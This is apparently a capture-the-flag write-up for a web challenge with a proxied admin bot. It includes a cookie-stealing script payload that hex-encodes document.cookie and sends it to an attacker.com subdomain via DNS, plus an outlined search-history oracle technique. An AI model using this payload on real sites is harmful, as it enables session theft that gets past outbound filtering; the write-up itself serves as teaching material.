# Overview

- The admin bot is using an http proxy as follows:
```python
def request(flow: http.HTTPFlow) -> None:
    if not flow.request.pretty_host == "127.0.0.1":
        flow.response = http.Response.make(
            403,  # (optional) status code
            b"Access Denied",  # (optional) content
            {"Content-Type": "text/html"}  # (optional) headers
        )
```

# Solution (was also unintended 😛)
- Credits to `sebastianpc` for the solution.
- Changing `document.location` manages to make DNS queries regardless of the proxy. 
```html
<script>

function convertToHex(str) {
    var hex = '';
    for(var i=0;i<str.length;i++) {
        hex += ''+str.charCodeAt(i).toString(16);
    }
    return hex;
}
document.location="http://"+ convertToHex(document.cookie.split("=")[1]).slice(0,30)+".attacker.com/"</script>
```

# Solution
- Notice that the `/search` param which holds history for other users' searches allows up to 100 post values.
- Make the bot hit the `/search` endpoint and use that as an oracle to leak the flag.
- One way would be:
  - For each character of the flag, send as many values as `ord(character)`. E.g. for `A`, send 65 values. See the search history and find the character.
- The problem with the above is that when other attackers do the same, the history will be polluted.
- A harder way is written in [solve.py](solve.py) which uses sets to find the character. We start with all possible values for each character and keep reducing the set until we find the character.
- There is no limit to one's imagination. One could also use the search history to leak the flag in a different way.